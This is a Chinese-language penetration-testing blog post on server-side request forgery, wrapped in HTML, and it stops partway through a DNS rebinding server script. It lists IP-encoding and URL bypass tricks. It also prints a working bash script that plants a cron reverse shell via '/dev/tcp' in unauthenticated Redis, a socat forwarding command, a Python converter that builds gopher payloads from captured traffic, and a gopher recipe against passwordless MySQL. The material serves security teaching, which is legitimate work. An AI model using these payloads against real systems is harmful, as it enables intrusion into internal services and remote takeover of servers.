@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>SSRF 漏洞相关 - Geekby&#39;s Blog</title><meta name="Description" content="SSRF 漏洞相关"><meta property="og:title" content="SSRF 漏洞相关" />
+<meta property="og:description" content="SSRF 漏洞相关" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-01-11T16:18:00+08:00" />
+<meta property="article:modified_time" content="2021-01-11T16:18:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SSRF 漏洞相关"/>
+<meta name="twitter:description" content="SSRF 漏洞相关"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/" /><link rel="prev" href="https://www.geekby.site/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/" /><link rel="next" href="https://www.geekby.site/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SSRF 漏洞相关",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2021\/01\/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "常用, 渗透测试","wordcount":  652 ,
+        "url": "https:\/\/www.geekby.site\/2021\/01\/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3\/","datePublished": "2021-01-11T16:18:00+08:00","dateModified": "2021-01-11T16:18:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "SSRF 漏洞相关"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">SSRF 漏洞相关</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%B8%B8%E7%94%A8/"><i class="far fa-folder fa-fw"></i>常用</a>&nbsp;<a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-11">2021-01-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 652 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-定义与原理">1 定义与原理</a>
+      <ul>
+        <li><a href="#11-定义">1.1 定义</a></li>
+        <li><a href="#12-特点">1.2 特点</a></li>
+        <li><a href="#13-检测方法">1.3 检测方法</a></li>
+        <li><a href="#14-php-中的相关函数">1.4 PHP 中的相关函数</a></li>
+        <li><a href="#14-危害">1.4 危害</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-绕过方法">2 绕过方法</a>
+      <ul>
+        <li><a href="#21-ip-绕过">2.1 IP 绕过</a></li>
+        <li><a href="#22-其它-tips">2.2 其它 Tips</a></li>
+        <li><a href="#23-gopher-协议">2.3 Gopher 协议</a>
+          <ul>
+            <li><a href="#231-gopher-控制-redis-反弹-shell">2.3.1 Gopher 控制 Redis 反弹 shell</a></li>
+            <li><a href="#232-gopher-对-mysql-的利用">2.3.2 Gopher 对 Mysql 的利用</a></li>
+            <li><a href="#233-相关工具">2.3.3 相关工具</a></li>
+          </ul>
+        </li>
+        <li><a href="#24-dns-重绑定攻击">2.4 DNS 重绑定攻击</a>
+          <ul>
+            <li><a href="#241-原理">2.4.1 原理</a></li>
+            <li><a href="#242-实现">2.4.2 实现</a></li>
+            <li><a href="#243-防御方法">2.4.3 防御方法</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="ssrf-漏洞相关">SSRF 漏洞相关</h1>
+<h2 id="1-定义与原理">1 定义与原理</h2>
+<h3 id="11-定义">1.1 定义</h3>
+<p>SSRF(Server-Side Request Forgery)，服务器请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下， SSRF 攻击的目标是从外网无法访问的内部系统。</p>
+<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111165741.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111165741.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111165741.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111165741.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111165741.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111165741.png-water_print" /></p>
+<h3 id="12-特点">1.2 特点</h3>
+<p>攻击者无法直接访问目标机器 2 的服务</p>
+<p>目标机器 1 能够访问目标机器 2 的服务</p>
+<p>目标机器 1 暴露了访问目标机器 2 的方式，攻击者能够利用</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111170123.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111170123.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111170123.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111170123.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111170123.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111170123.png-water_print" /></p>
+<h3 id="13-检测方法">1.3 检测方法</h3>
+<ol>
+<li>因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在 SSRF 漏洞</li>
+<li>在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <code>www.baidu.com/xxx.php?image=</code>（地址）的就可能存在 SSRF 漏洞</li>
+</ol>
+<h3 id="14-php-中的相关函数">1.4 PHP 中的相关函数</h3>
+<ul>
+<li>file_get_contents()</li>
+<li>fsockopen()</li>
+<li>curl_exec()</li>
+</ul>
+<h3 id="14-危害">1.4 危害</h3>
+<ul>
+<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li>
+<li>攻击运行在内网或本地的应用程序(比如溢出)</li>
+<li>对内网 Web 应用进行指纹识别，通过访问默认文件实现</li>
+<li>攻击内外网的 Web 应用，主要是使用 get 参数就可以实现的攻击(比如 Struts2 漏洞利用，SQL 注入等)</li>
+<li>利用 File 协议读取本地文件</li>
+</ul>
+<h2 id="2-绕过方法">2 绕过方法</h2>
+<h3 id="21-ip-绕过">2.1 IP 绕过</h3>
+<ul>
+<li>加端口</li>
+<li>短网址，但是默认情况下 CURL 命令不开启 follow 302 跳转</li>
+<li>指向任意 IP 的域名 xip.io，<code>127.0.0.1.xip.io</code></li>
+<li>IP 限制绕过
+<ul>
+<li>127.0.0.1</li>
+<li>0177.0.0.1 八进制</li>
+<li>0x7f.0.0.1 十六进制</li>
+<li>十六进制去掉分隔符 <code>http://0x7F000001</code></li>
+<li>十进制去掉分隔符 <code>http://2130706433</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="22-其它-tips">2.2 其它 Tips</h3>
+<ul>
+<li>结合 dict:// file:// gopher://</li>
+<li><code>http://www.baidu.com@192.168.0.1</code>
+<ul>
+<li>以 <code>www.baidu.com</code> 用户名，检测是否有权限访问 192.168.0.1 的网站</li>
+</ul>
+</li>
+<li>短连接（301 跳转，需要能访问到外网）</li>
+</ul>
+<h3 id="23-gopher-协议">2.3 Gopher 协议</h3>
+<p>gopher 是一个互联网上使用的分布型的文件搜集获取网络协议</p>
+<p>gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。 gopher 协议是 ssrf 利用中一个最强大的协议(俗称万能协议)。</p>
+<h4 id="231-gopher-控制-redis-反弹-shell">2.3.1 Gopher 控制 Redis 反弹 shell</h4>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>前提<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>redis 未授权</p>
+<p>redis 对 cron 有写权限</p>
+</div>
+        </div>
+    </div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111224322.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111224322.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111224322.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111224322.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111224322.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111224322.png-water_print" /></p>
+<p><strong>通过 socat 抓流量</strong></p>
+<p>脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> -e <span class="s2">&#34;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/ip/port 0 &gt;&amp;1\n\n&#34;</span><span class="p">|</span>redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> -x <span class="nb">set</span> <span class="m">1</span>
+redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> config <span class="nb">set</span> dir /var/spool/cron
+redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> config <span class="nb">set</span> dbfilename root
+redis-cli -h <span class="nv">$1</span> -p <span class="nv">$2</span> quit
+</code></pre></td></tr></table>
+</div>
+</div><p>执行：./shell.sh 127.0.0.1 4444</p>
+<p><strong>流量转发</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">socat -v tcp-listen:4444,fork tcp-connect:IP:6379
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111225155.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111225155.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111225155.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111225155.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111225155.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210111225155.png-water_print" /></p>
+<p>流量转换</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># coding: utf-8</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+        <span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="s1">&#39;&gt;&lt;+&#39;</span><span class="p">:</span>
+            <span class="k">continue</span>
+        <span class="c1"># 判断倒数第 2、3 字符串是否为 \r</span>
+        <span class="k">elif</span> <span class="n">line</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="sa">r</span><span class="s1">&#39;\r&#39;</span><span class="p">:</span>
+            <span class="c1"># 如果该行只有 \r，将 \r 替换成 %0a%0d%0a</span>
+            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+                <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%0a%0d%0a</span><span class="s1">&#39;</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\r&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="si">%0d%0a</span><span class="s1">&#39;</span><span class="p">)</span>
+                <span class="c1"># 去掉最后的换行符</span>
+                <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+                <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="n">line</span>
+        <span class="c1"># 判断是否是空行，空行替换为 %0a</span>
+        <span class="k">elif</span> <span class="n">line</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\x0a</span><span class="s1">&#39;</span><span class="p">:</span>
+            <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">%0a</span><span class="s1">&#39;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+            <span class="n">exp</span> <span class="o">=</span> <span class="n">exp</span> <span class="o">+</span> <span class="n">line</span>
+<span class="nb">print</span> <span class="n">exp</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="232-gopher-对-mysql-的利用">2.3.2 Gopher 对 Mysql 的利用</h4>
+<p>前提：</p>
+<ul>
+<li>存在 SSRF 漏洞</li>
+<li>MySQL 无密码</li>
+</ul>
+<p>Gopher 协议转化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">gopher://127.0.0.1:3306/_
++ url 编码的登录请求
++ 包长度(wireshark 抓包时可以直接看到 Packet Length)
++ %00%00%00%03
++ 查询语句(URL 编码)
++ %01%00%00%00%01
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="233-相关工具">2.3.3 相关工具</h4>
+<p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener noreffer">https://github.com/tarunkant/Gopherus</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101832.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101832.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101832.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101832.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101832.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101832.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101956.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101956.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101956.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101956.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101956.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101956.png-water_print" /></p>
+<h3 id="24-dns-重绑定攻击">2.4 DNS 重绑定攻击</h3>
+<h4 id="241-原理">2.4.1 原理</h4>
+<p>一般 web 应用程序防御 SSRF 的流程如下：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101758.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101758.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101758.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101758.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101758.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210112101758.png-water_print" /></p>
+<ol>
+<li>获取到输入的 URL，从该 URL 中提取 host</li>
+<li>对该 host 进行 DNS 解析，获取到解析的 IP</li>
+<li>检测该 IP 是否是合法的，比如是否是私有 IP 等</li>
+<li>如果 IP 检测为合法的，则进入 curl 的阶段发包</li>
+</ol>
+<p>观察到，在这个流程中，一共进行了两次 DNS 解析：第一次是对 URL 的 host 进行 DNS 解析，第二次是使用 curl 发包的时候进行解析。这两次 DNS 解析是有时间差的，我们可以使用这个时间差进行绕过。</p>
+<p>时间差对应的 DNS 中的机制是 <code>TTL</code>。TTL 表示 DNS 里面域名和 IP 绑定关系的 Cache 在 DNS 上存活的最长时间。即请求了域名与 IP 的关系后，请求方会缓存这个关系，缓存保持的时间就是 TTL。而缓存失效后就会删除，这时候如果重新访问域名指定的 IP 的话会重新建立匹配关系及 cache。</p>
+<p>在上面的流程中，如果在 DNS 第二次解析的时候，我们能够更换 URL 对应的 IP，那么在 TTL 之后、缓存失效之后，重新访问此 URL 的话，就能获取被更换后的 IP。如果我们把第一次解析的 IP 设为合法 IP，就能绕过 host 合法性检查；把第二次解析的 IP 设为内网 IP，就达到了 SSRF 访问内网的目的。</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>总结<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">DNS 重绑定攻击的原理是：利用服务器两次解析同一域名的短暂间隙，更换域名背后的 ip 达到突破同源策略或过 waf 进行 ssrf 的目的。</div>
+        </div>
+    </div>
+<h4 id="242-实现">2.4.2 实现</h4>
+<p><strong>一些 DNS Rebinding 平台</strong></p>
+<ul>
+<li><a href="https://lock.cmpxchg8b.com/rebinder.html" target="_blank" rel="noopener noreffer">https://lock.cmpxchg8b.com/rebinder.html</a></li>
+<li><a href="https://requestrepo.com/" target="_blank" rel="noopener noreffer">https://requestrepo.com/</a></li>
+</ul>
+<p><strong>手动实现</strong></p>
+<p>需要先添加一条 NS 记录和一条 A 记录：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">记录类型</th>
+<th style="text-align:center">主机记录</th>
+<th style="text-align:center">记录值</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">NS</td>
+<td style="text-align:center">test</td>
+<td style="text-align:center">ns.geekby.xyz</td>
+</tr>
+<tr>
+<td style="text-align:center">A</td>
+<td style="text-align:center">ns</td>
+<td style="text-align:center">39.96.14.41</td>
+</tr>
+</tbody>
+</table>
+<p>NS 记录表示域名 <code>test.geekby.xyz</code> 这个子域名指定由 <code>ns.geekby.xyz</code> 这个域名服务器来解析，然后 A 记录表示这个 <code>ns.geekby.xyz</code> 的位置在 IP 地址 <code>39.96.14.41</code> 上。</p>
+<p>这里搭建 DNS 服务器采用 python 的 twisted 库中的 name 模块，代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">twisted.internet</span> <span class="kn">import</span> <span class="n">reactor</span><span class="p">,</span> <span class="n">defer</span>
+<span class="kn">from</span> <span class="nn">twisted.names</span> <span class="kn">import</span> <span class="n">client</span><span class="p">,</span> <span class="n">dns</span><span class="p">,</span> <span class="n">error</span><span class="p">,</span> <span class="n">server</span>
+
+<span class="n">record</span><span class="o">=</span><span class="p">{}</span>
+
+<span class="k">class</span> <span class="nc">DynamicResolver</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+
+    <span class="k">def</span> <span class="nf">_doDynamicResponse</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">):</span>
+        <span class="n">name</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">name</span>
+
+        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span> <span class="ow">or</span> <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
